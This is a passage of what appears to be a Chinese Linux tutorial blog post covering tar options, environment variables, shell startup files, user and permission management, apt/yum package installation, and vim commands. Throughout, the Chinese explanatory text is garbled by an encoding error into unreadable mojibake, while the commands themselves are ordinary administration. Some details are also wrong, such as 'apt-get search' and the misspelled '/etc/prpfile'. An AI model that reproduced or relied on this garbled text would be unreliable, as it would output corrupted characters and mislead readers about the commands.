style="text-align:center">-c</td><td style="text-align:center">åˆ›å»ºä¸€ä¸ªæ–°çš„tarå½’æ¡£æ–‡ä»¶</td></tr><tr><td style="text-align:center">-d</td><td style="text-align:center">æ£€æŸ¥å½’æ¡£æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿçš„ä¸åŒä¹‹å¤„</td></tr><tr><td style="text-align:center">-r</td><td style="text-align:center">è¿½åŠ æ–‡ä»¶åˆ°å·²æœ‰tarå½’æ¡£æ–‡ä»¶æœ«å°¾</td></tr><tr><td style="text-align:center">-t</td><td style="text-align:center">åˆ—å‡ºå·²æœ‰tarå½’æ¡£æ–‡ä»¶çš„å†…å®¹</td></tr><tr><td style="text-align:center">-u</td><td style="text-align:center">å°†æ¯”tarå½’æ¡£æ–‡ä»¶ä¸­å·²æœ‰çš„åŒåæ–‡ä»¶æ–°çš„æ–‡ä»¶è¿½åŠ åˆ°è¯¥tarå½’æ¡£æ–‡ä»¶ä¸­ï¼Œç®€å•æ¥è¯´å°±æ˜¯æ›´æ–°æ–‡ä»¶å†…å®¹</td></tr><tr><td style="text-align:center">-x</td><td style="text-align:center">ä»å·²æœ‰tarå½’æ¡£æ–‡ä»¶ä¸­æå–æ–‡ä»¶</td></tr></tbody></table></div><ul><li><strong>tarå‘½ä»¤çš„é€‰é¡¹</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">é€‰é¡¹</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">-C</td><td style="text-align:center">åˆ‡æ¢åˆ°æŒ‡å®šç›®å½•</td></tr><tr><td style="text-align:center">-f file</td><td style="text-align:center">è¾“å‡ºç»“æœåˆ°æ–‡ä»¶æˆ–è®¾å¤‡file</td></tr><tr><td style="text-align:center">-j</td><td style="text-align:center">å°†è¾“å‡ºé‡å®šå‘ç»™bzip2æ¥å‹ç¼©å†…å®¹</td></tr><tr><td style="text-align:center">-p</td><td style="text-align:center">ä¿ç•™æ‰€æœ‰æ–‡ä»¶æƒé™</td></tr><tr><td style="text-align:center">-v</td><td style="text-align:center">åœ¨å¤„ç†æ–‡ä»¶æ—¶æ˜¾ç¤ºæ–‡ä»¶</td></tr><tr><td style="text-align:center">-z</td><td style="text-align:center">å°†è¾“å‡ºé‡å®šå‘ç»™gzipå‘½ä»¤æ¥å‹ç¼©å†…å®¹</td></tr></tbody></table></div><p>å¸¸ç”¨tarå‘½ä»¤ç»“æ„ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">tar -cvf test.tar test1&#x2F; test2&#x2F;  # åˆ›å»ºåä¸ºtest.tarçš„å½’æ¡£æ–‡ä»¶ï¼Œå«æœ‰test1å’Œtest2ç›®å½•å†…å®¹ tar -tf test.tar  # åˆ—å‡ºtaræ–‡ä»¶test.tarçš„å†…å®¹ï¼ˆå¹¶ä¸æå–æ–‡ä»¶ï¼‰tar -xvf test.tar  # æå–test.tarå†…å®¹tar -zxvf  test.tgz  # è§£å‹ä»¥.tgzç»“å°¾çš„å‹ç¼©æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><h1 id="Linuxç¯å¢ƒå˜é‡"><a href="#Linuxç¯å¢ƒå˜é‡" class="headerlink" title="Linuxç¯å¢ƒå˜é‡"></a>Linuxç¯å¢ƒå˜é‡</h1><p>ç¯å¢ƒå˜é‡çš„å®šä¹‰ï¼š<br>bash shell ç”¨ç¯å¢ƒå˜é‡çš„ç‰¹æ€§æ¥å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯ï¼Œå…è®¸æˆ‘ä»¬åœ¨å†…å­˜ä¸­å­˜å‚¨æ•°æ®ï¼Œä»¥ä¾¿ç¨‹åºæˆ–shellä¸­è¿è¡Œçš„è„šæœ¬èƒ½å¤Ÿè½»æ¾è®¿é—®åˆ°å®ƒä»¬ã€‚  </p><h2 id="å…¨å±€ç¯å¢ƒå˜é‡"><a href="#å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="å…¨å±€ç¯å¢ƒå˜é‡"></a>å…¨å±€ç¯å¢ƒå˜é‡</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">printenv  # æŸ¥çœ‹å…¨å±€å˜é‡<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200302133133279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /><br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">printenv HOME  # æ˜¾ç¤ºæŸä¸ªç¯å¢ƒå˜é‡echo $HOME  # æ˜¾ç¤ºæŸä¸ªç¯å¢ƒå˜é‡ï¼Œéœ€è¦åŠ $ï¼Œä¸”åŠ äº†$å¯ä»¥ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">export variable  # variableæ˜¯ä¸€ä¸ªå±€éƒ¨ç¯å¢ƒå˜é‡ï¼Œç›¸å½“äºå°†å±€éƒ¨å˜ä¸ºå…¨å±€<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>æ°¸ä¹…è®¾ç½®å…¨å±€ç¯å¢ƒå˜é‡ï¼š<br>åœ¨$HOME/.bashrc ä¸­å®šä¹‰å…¨å±€ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚å°†aliasè®¾ç½®æ”¾åœ¨.bashrcå¯åŠ¨æ–‡ä»¶ä¸­ ï¼Œæˆ–è€…å­˜å‚¨åœ¨.profileæ–‡ä»¶ä¸­</p><h2 id="å±€éƒ¨ç¯å¢ƒå˜é‡"><a href="#å±€éƒ¨ç¯å¢ƒå˜é‡" class="headerlink" title="å±€éƒ¨ç¯å¢ƒå˜é‡"></a>å±€éƒ¨ç¯å¢ƒå˜é‡</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">set # æ˜¾ç¤ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„ç¯å¢ƒå˜é‡<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>è®¾ç½®å±€éƒ¨ç¯å¢ƒå˜é‡<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">echo $variablevariable&#x3D;test  # æ³¨æ„ä¸­é—´ä¸èƒ½æœ‰ç©ºæ ¼echo $variable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><br>åˆ é™¤ç¯å¢ƒå˜é‡<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">unset variable  # æ³¨æ„è¿™æ—¶å€™ä¸åŠ $<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="PATHç¯å¢ƒå˜é‡"><a href="#PATHç¯å¢ƒå˜é‡" class="headerlink" title="PATHç¯å¢ƒå˜é‡"></a>PATHç¯å¢ƒå˜é‡</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">PATH&#x3D;$PATH:new_dir  # æ·»åŠ new_diråˆ°PATHä¸­ï¼Œæ­¤ä¿®æ”¹ä»…æŒç»­åˆ°é€€å‡ºæˆ–é‡å¯ç³»ç»Ÿ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>ç™»å½•shellåï¼Œshellä¼šä»ä»¥ä¸‹5ä¸ªä¸åŒçš„å¯åŠ¨æ–‡ä»¶ä¸­è¯»å–å‘½ä»¤ï¼š</p><div class="table-container"><table><thead><tr><th style="text-align:left">æ–‡ä»¶å</th><th style="text-align:left">å¤‡æ³¨</th></tr></thead><tbody><tr><td style="text-align:left">/etc/profile</td><td style="text-align:left">ç³»ç»Ÿä¸Šé»˜è®¤shellå¯åŠ¨æ–‡ä»¶ï¼Œä¸åˆ†ç”¨æˆ·ã€‚<br>ubantuç‰ˆæœ¬ä¸­æ¶‰åŠ/etc/bash.bashrc,è¯¥æ–‡ä»¶åŒ…å«äº†ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼Œä½†CentOSç‰ˆæœ¬ä¸­æ²¡æœ‰<br>æ–‡ä»¶ä¸­ä¸»è¦forå¾ªç¯è¿­ä»£å¯åŠ¨/etc/profile.dç›®å½•ä¸‹çš„æ–‡ä»¶</td></tr><tr><td style="text-align:left">$HOME/.bash_profile</td><td style="text-align:left">æ£€æŸ¥HOMEç›®å½•æ˜¯å¦æœ‰.bashrc,è‹¥æœ‰ï¼Œåˆ™æ‰§è¡Œ.bashrcé‡Œçš„å‘½ä»¤ï¼Œå¦‚æœå­˜åœ¨åˆ™å¿½ç•¥å‰©ä¸‹çš„å¯åŠ¨æ–‡ä»¶</td></tr><tr><td style="text-align:left">$HOME/.bashrc</td><td style="text-align:left">å­˜æ”¾å¯åŠ¨shellæ—¶ä¼šæ‰§è¡Œçš„å‘½ä»¤</td></tr><tr><td style="text-align:left">$HOME/.bash_login</td><td style="text-align:left">åŠŸèƒ½ä¸bash_profileç±»ä¼¼ï¼Œä½†æ‰§è¡Œä¼˜å…ˆçº§æ™š</td></tr><tr><td style="text-align:left">$HOME/.profile</td><td style="text-align:left">åŒä¸Š</td></tr></tbody></table></div><h1 id="Linuxæ–‡ä»¶æƒé™"><a href="#Linuxæ–‡ä»¶æƒé™" class="headerlink" title="Linuxæ–‡ä»¶æƒé™"></a>Linuxæ–‡ä»¶æƒé™</h1><h2 id="æ·»åŠ æ–°ç”¨æˆ·"><a href="#æ·»åŠ æ–°ç”¨æˆ·" class="headerlink" title="æ·»åŠ æ–°ç”¨æˆ·"></a>æ·»åŠ æ–°ç”¨æˆ·</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">useradd &lt;user&gt;  # æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ· <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>æ·»åŠ ç”¨æˆ·ä¹‹åè¯¥ç”¨æˆ·è¿˜æ²¡æœ‰å¯†ç ï¼Œéœ€è¦é€šè¿‡passwdå‘½ä»¤ç»™è¯¥ç”¨æˆ·æ·»åŠ å¯†ç <br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">passwd &lt;user&gt;  # è¾“å…¥å‘½ä»¤åæ ¹æ®æç¤ºè¾“å…¥å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>é€šè¿‡å‘½ä»¤åˆ›å»ºçš„ç”¨æˆ·å­˜æ”¾åœ¨/etc/passwdæ–‡ä»¶ä¸­</p><h2 id="åˆ é™¤ç”¨æˆ·"><a href="#åˆ é™¤ç”¨æˆ·" class="headerlink" title="åˆ é™¤ç”¨æˆ·"></a>åˆ é™¤ç”¨æˆ·</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">userdel &lt;user&gt;  # åªä¼šåˆ é™¤&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¸åˆ é™¤ç³»ç»Ÿä¸­å±äºè¯¥ç”¨æˆ·çš„ä»»ä½•æ–‡ä»¶userdel -r &lt;user&gt;  # åˆ é™¤è¯¥ç”¨æˆ·åœ¨homeä¸­çš„æ–‡ä»¶å’Œè¯¥ç”¨æˆ·<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="ä¿®æ”¹ç”¨æˆ·"><a href="#ä¿®æ”¹ç”¨æˆ·" class="headerlink" title="ä¿®æ”¹ç”¨æˆ·"></a>ä¿®æ”¹ç”¨æˆ·</h2><ul><li><strong>ç”¨æˆ·è´¦æˆ·ä¿®æ”¹å·¥å…·</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">å‘½ä»¤</th><th style="text-align:left">ç”¨é€”</th></tr></thead><tbody><tr><td style="text-align:left">usermod</td><td style="text-align:left">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·å­—æ®µï¼Œè¿˜å¯ä»¥æŒ‡å®šä¸»è¦ç»„ä»¥åŠé™„åŠ ç»„çš„æ‰€å±å…³ç³»</td></tr><tr><td style="text-align:left">passwd</td><td style="text-align:left">ä¿®æ”¹å·²æœ‰ç”¨æˆ·çš„å¯†ç </td></tr><tr><td style="text-align:left">chpasswd</td><td style="text-align:left">ä»æ–‡ä»¶ä¸­è¯»å–ç™»å½•åå¯†ç å¯¹ï¼Œå¹¶æ›´æ–°å¯†ç </td></tr><tr><td style="text-align:left">chage</td><td style="text-align:left">ä¿®æ”¹å¯†ç çš„è¿‡æœŸæ—¥æœŸ</td></tr><tr><td style="text-align:left">chfn</td><td style="text-align:left">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„å¤‡æ³¨ä¿¡æ¯</td></tr><tr><td style="text-align:left">chsh</td><td style="text-align:left">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„é»˜è®¤ç™»å½•shell</td></tr></tbody></table></div><ul><li>usermodçš„å‚æ•°</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">å‚æ•°</th><th style="text-align:left">ç”¨é€”</th></tr></thead><tbody><tr><td style="text-align:left">-c</td><td style="text-align:left">ä¿®æ”¹å¤‡æ³¨å­—æ®µ</td></tr><tr><td style="text-align:left">-e</td><td style="text-align:left">ä¿®æ”¹è¿‡æœŸæ—¥æœŸ</td></tr><tr><td style="text-align:left">-g</td><td style="text-align:left">ä¿®æ”¹é»˜è®¤çš„ç™»å½•ç»„</td></tr><tr><td style="text-align:left">-l</td><td style="text-align:left">ä¿®æ”¹ç”¨æˆ·è´¦æˆ·çš„ç™»å½•å</td></tr><tr><td style="text-align:left">-L</td><td style="text-align:left">é”å®šè´¦æˆ·ï¼Œä½¿ç”¨æˆ·æ— æ³•ç™»å½•</td></tr><tr><td style="text-align:left">-p</td><td style="text-align:left">ä¿®æ”¹è´¦æˆ·å¯†ç </td></tr><tr><td style="text-align:left">-U</td><td style="text-align:left">æ¥è§¦é”å®šï¼Œä½¿è´¦æˆ·èƒ½å¤Ÿç™»å½•</td></tr></tbody></table></div><h2 id="Linuxç»„"><a href="#Linuxç»„" class="headerlink" title="Linuxç»„"></a>Linuxç»„</h2><p>å°±æ˜¯ä¸€å †ç”¨æˆ·å…±äº«åŒä¸€æƒé™ï¼Œç”¨æˆ·ç»„ä¿¡æ¯ä¿å­˜åœ¨/etc/groupæ–‡ä»¶ä¸­<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">groupadd group  # åˆ›å»ºæ–°ç»„<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>æ›´å¤šç”¨æˆ·ç»„å‘½ä»¤ç”±äºæ¶‰åŠä¸å¤šï¼Œä¸ä¸€ä¸€åˆ—ä¸¾ï¼Œä»¥åè¡¥ä¸Š</p><h2 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h2><p>ç†è§£ls -låˆ—å‡ºçš„æ–‡ä»¶æƒé™å­—æ®µå«ä¹‰</p><p><img src="https://img-blog.csdnimg.cn/20200302133206168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><p>ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯æè¿°æ–‡ä»¶å’Œç›®å½•æƒé™çš„ç¼–ç ï¼š<br>-:æ–‡ä»¶<br>d:ç›®å½•<br>l:é“¾æ¥<br>c:å­—ç¬¦å‹è®¾å¤‡<br>b:å—è®¾å¤‡<br>n:ç½‘ç»œè®¾å¤‡<br>æ¥ç€æ˜¯3ç»„å­—ç¬¦çš„ç¼–ç ï¼š<br>r:å¯è¯»<br>w:å¯å†™<br>x:å¯æ‰§è¡Œ<br>ä¸‰ç»„åˆ†åˆ«æ˜¯å¯¹è±¡å±ä¸»ï¼Œå¯¹è±¡æ•°ç»„ï¼Œå…¶ä»–ç”¨æˆ·  </p><ul><li><strong>é»˜è®¤æƒé™</strong><br>é»˜è®¤æƒé™ç”±umaskå‘½ä»¤è®¾ç½®ï¼Œæƒé™çš„èµ‹äºˆé‡‡ç”¨å…«è¿›åˆ¶ï¼Œä¸‹è¡¨è®°å½•äº†å¸¸ç”¨çš„æƒé™å¯¹åº”çš„å…«è¿›åˆ¶å€¼  </li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">æƒé™</th><th style="text-align:center">äºŒè¿›åˆ¶</th><th style="text-align:center">å…«è¿›åˆ¶</th><th style="text-align:center">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:center">â€”-</td><td style="text-align:center">000</td><td style="text-align:center">0</td><td style="text-align:center">æ— æƒé™</td></tr><tr><td style="text-align:center">â€”x</td><td style="text-align:center">001</td><td style="text-align:center">1</td><td style="text-align:center">åªæœ‰æ‰§è¡Œæƒé™</td></tr><tr><td style="text-align:center">-w-</td><td style="text-align:center">010</td><td style="text-align:center">2</td><td style="text-align:center">åªæœ‰å†™æƒé™</td></tr><tr><td style="text-align:center">-wx</td><td style="text-align:center">011</td><td style="text-align:center">3</td><td style="text-align:center">å†™+æ‰§è¡Œ</td></tr><tr><td style="text-align:center">râ€”</td><td style="text-align:center">100</td><td style="text-align:center">4</td><td style="text-align:center">åªè¯»</td></tr><tr><td style="text-align:center">r-x</td><td style="text-align:center">101</td><td style="text-align:center">5</td><td style="text-align:center">è¯»+æ‰§è¡Œ</td></tr><tr><td style="text-align:center">rw-</td><td style="text-align:center">110</td><td style="text-align:center">6</td><td style="text-align:center">è¯»å†™</td></tr><tr><td style="text-align:center">rwx</td><td style="text-align:center">111</td><td style="text-align:center">7</td><td style="text-align:center">å…¨éƒ¨æƒé™</td></tr></tbody></table></div><p>umaskå€¼æ˜¯ä¸ªæ©ç ï¼Œä¼šå±è”½ä¸æƒ³æˆäºˆå®‰å…¨çº§åˆ«çš„æƒé™<br>ä¾‹å¦‚umask = 026 ï¼Œåˆ™ç›®å½•çš„é»˜è®¤æƒé™æ˜¯ 777-026 = 751ï¼Œæ–‡ä»¶çš„é»˜è®¤æƒé™æ˜¯666-026 = 640<br>umaskè®¾ç½®åœ¨/etc/prpfileå¯åŠ¨æ–‡ä»¶ä¸­  </p><ul><li><strong>æ”¹å˜æƒé™</strong></li></ul><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">chmod 777 file  # èµ‹äºˆfileçš„æ‰€æœ‰æƒé™ç»™æ‰€æœ‰äººchmod +x file   # ç»™æ‰€æœ‰äººæ·»åŠ fileçš„æ‰§è¡Œæƒé™chmod o+x file  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><p>chmod [ugoa] [+-=] [rxw] file<br>è¿™ç§å½¢å¼å…è®¸é’ˆå¯¹ç”¨æˆ·æˆ–ç»„ï¼Œæ·»åŠ ä¿®æ”¹æƒé™ï¼Œuä»£è¡¨ç”¨æˆ·ï¼Œgä»£è¡¨ç»„ï¼Œoä»£è¡¨å…¶ä»–ï¼Œaä»£è¡¨ä¸Šè¿°æ‰€æœ‰  </p><h1 id="å®‰è£…è½¯ä»¶ç¨‹åº"><a href="#å®‰è£…è½¯ä»¶ç¨‹åº" class="headerlink" title="å®‰è£…è½¯ä»¶ç¨‹åº"></a>å®‰è£…è½¯ä»¶ç¨‹åº</h1><h2 id="åŸºäºDebianç³»ç»Ÿ"><a href="#åŸºäºDebianç³»ç»Ÿ" class="headerlink" title="åŸºäºDebianç³»ç»Ÿ"></a>åŸºäºDebianç³»ç»Ÿ</h2><p>é‡‡ç”¨dpkgå‘½ä»¤ç›´æ¥å’ŒLinuxç³»ç»Ÿä¸Šçš„PMSï¼ˆpackage management system åŒ…ç®¡ç†ç³»ç»Ÿï¼‰äº¤äº’ï¼Œç”¨æ¥å®‰è£…ã€ç®¡ç†å’Œåˆ é™¤è½¯ä»¶åŒ…<br>åŒ…å«åœ¨æ­¤PMSçš„å…¶ä»–å·¥å…·æœ‰ï¼š<br>1ã€apt-get<br>2ã€apt-cache<br>3ã€aptitude  </p><ul><li><strong>ç”¨apt-getå®‰è£…è½¯ä»¶åŒ…</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">apt-get search package_name  # æŸ¥æ‰¾è½¯ä»¶åŒ…apt-get install package_name  # å®‰è£…è½¯ä»¶åŒ…apt-get safe-upgrade  # æ›´æ–°è½¯ä»¶åŒ…apt-get remove package_name  # å¸è½½è½¯ä»¶,åªåˆ é™¤è½¯ä»¶åŒ…apt-get purge package_name  # åˆ é™¤è½¯ä»¶åŒ…å’Œç›¸å…³çš„æ•°æ®å’Œé…ç½®æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>ubantuä¸‹ç»Ÿä¸€äº†aptå‘½ä»¤ï¼Œå¯ä»¥å°†ä¸Šè¿°å…¨æ›¿æ¢æˆapt</li><li><strong>dpkgå®‰è£….debåŒ…</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">dpkg -i jdk-XXX_linux-x64_bin.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul><p>é…ç½®æ–‡ä»¶è·¯å¾„ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#x2F;etc&#x2F;apt&#x2F;sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä»¥æ¬ç“¦å·¥çš„ubantuç³»ç»ŸæœåŠ¡å™¨ä¸ºä¾‹<br><img src="https://img-blog.csdnimg.cn/2020030213325689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><h2 id="7-2-åŸºäºRed-Hatç³»ç»Ÿ"><a href="#7-2-åŸºäºRed-Hatç³»ç»Ÿ" class="headerlink" title="7.2 åŸºäºRed Hatç³»ç»Ÿ"></a>7.2 åŸºäºRed Hatç³»ç»Ÿ</h2><p>é‡‡ç”¨rpmå‘½ä»¤ï¼Œå¸¸è§çš„å‰ç«¯å·¥å…·æœ‰ï¼š<br>1ã€yumï¼šåœ¨Red Hat å’ŒFedoraä½¿ç”¨<br>2ã€urpmï¼š åœ¨Mandrivaä½¿ç”¨<br>3ã€zypperï¼šåœ¨openSUSEä½¿ç”¨<br>ç”±äºyumä½¿ç”¨è¾ƒå¤šï¼Œä»¥yumä¸ºä¾‹  </p><ul><li><p><strong>ç”¨yumå®‰è£…è½¯ä»¶åŒ…</strong></p>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">yum list installed  # åˆ—å‡ºå·²å®‰è£…çš„åŒ…yum list installed &gt; installed_software  # å°†å·²å®‰è£…åŒ…çš„åˆ—è¡¨é‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­  yum install package_name  # å®‰è£…è½¯ä»¶yum localinstall package_name.rpm  # æœ¬åœ°å®‰è£…rpmå®‰è£…åŒ…yum list updates  # åˆ—å‡ºæ‰€æœ‰å·²å®‰è£…åŒ…çš„å¯ç”¨æ›´æ–°yum update packet_name  # è·Ÿæ–°æŒ‡å®šåŒ…yum update  # å¯¹æ›´æ–°åˆ—è¡¨ä¸­æ‰€æœ‰åŒ…è¿›è¡Œæ›´æ–°yum remove package_name  # åªåˆ é™¤è½¯ä»¶åŒ…è€Œä¿ç•™é…ç½®æ–‡ä»¶å’Œæ•°æ®æ–‡ä»¶yum erase package_name  #  åˆ é™¤è½¯ä»¶å’Œå®ƒæ‰€æœ‰çš„æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><p><strong>ç”¨rpmå®‰è£…rpmåŒ…</strong>  </p>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">rpm -i jdk-XXX_linux-x64_bin.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><strong>å¤„ç†æŸååŒ…ä¾èµ–å…³ç³»</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">yum clean all  # æ¸…é™¤æŸåä¾èµ–åŒ…yum update yum deplist package_name  # æ˜¾ç¤ºè¯¥åŒ…çš„æ‰€æœ‰åŒ…ä¾èµ–å…³ç³»<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><p>é…ç½®æ–‡ä»¶è·¯å¾„<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>ä»¥é˜¿é‡Œäº‘centosæœåŠ¡å™¨ä¸ºä¾‹ï¼š<br><img src="https://img-blog.csdnimg.cn/20200302133313747.png?#pic_center =500x300" style="zoom:50%;" /></p><h1 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h1><h2 id="vimç¼–è¾‘å™¨"><a href="#vimç¼–è¾‘å™¨" class="headerlink" title="vimç¼–è¾‘å™¨"></a>vimç¼–è¾‘å™¨</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">PageDown(Ctrl+F):ä¸‹ä¸€é¡µPageUp(Ctrl+B):ä¸Šä¸€é¡µGï¼šç§»åˆ°æœ€åä¸€è¡Œnum Gï¼šç§»åŠ¨ç¬¬numè¡Œggï¼šç§»åˆ°ç¬¬ä¸€è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>å…¨é€‰å‘½ä»¤ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ggVG  # +y å¤åˆ¶,+dåˆ é™¤ï¼Œ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><ul><li><strong>vimç¼–è¾‘å‘½ä»¤</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">å‘½ä»¤</th><th style="text-align:left">ä½œç”¨</th></tr></thead><tbody><tr><td style="text-align:left">x</td><td style="text-align:left">åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®å­—ç¬¦ï¼Œå‰é¢åŠ æ•°å­—åˆ é™¤å¤šä¸ªå­—ç¬¦ï¼ˆæˆ–è€…è¿›å…¥æ’å…¥æ¨¡å¼ç”¨é€€æ ¼æˆ–deleteé”®ï¼‰</td></tr><tr><td style="text-align:left">dd</td><td style="text-align:left">åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œï¼Œå‰é¢åŠ æ•°å­—å°±å¯ä»¥åˆ é™¤å¤šè¡Œ</td></tr><tr><td style="text-align:left">dw</td><td style="text-align:left">åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®å•è¯</td></tr><tr><td style="text-align:left">d$</td><td style="text-align:left">åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®è‡³è¡Œå°¾å†…å®¹</td></tr><tr><td style="text-align:left">J</td><td style="text-align:left">åˆ é™¤å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®è¡Œå°¾çš„æ¢è¡Œç¬¦ï¼Œç”¨äºæ‹¼æ¥ä¸¤è¡Œ</td></tr><tr><td style="text-align:left">u</td><td style="text-align:left">æ’¤é”€å‰ä¸€ç¼–è¾‘å‘½ä»¤</td></tr><tr><td style="text-align:left">a</td><td style="text-align:left">åœ¨å½“å‰å…‰æ ‡åè¿½åŠ æ•°æ®</td></tr><tr><td style="text-align:left">A</td><td style="text-align:left">åœ¨å½“å‰å…‰æ ‡æ‰€åœ¨è¡Œè¡Œå°¾è¿½åŠ æ•°æ®</td></tr><tr><td style="text-align:left">r char</td><td style="text-align:left">ç”¨charæ›¿æ¢å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®çš„å•ä¸ªå­—ç¬¦</td></tr><tr><td style="text-align:left">R text</td><td style="text-align:left">ç”¨textè¦†ç›–å½“å‰å…‰æ ‡æ‰€åœ¨ä½ç½®æ•°æ®ï¼Œç›´åˆ°æŒ‰ä¸‹ESCé”®</td></tr></tbody></table></div><ul><li><strong>å¤åˆ¶ã€ç²˜è´´</strong><br>å‰ªåˆ‡ï¼šddä¹‹å+pï¼ˆå› ä¸ºvimåœ¨åˆ 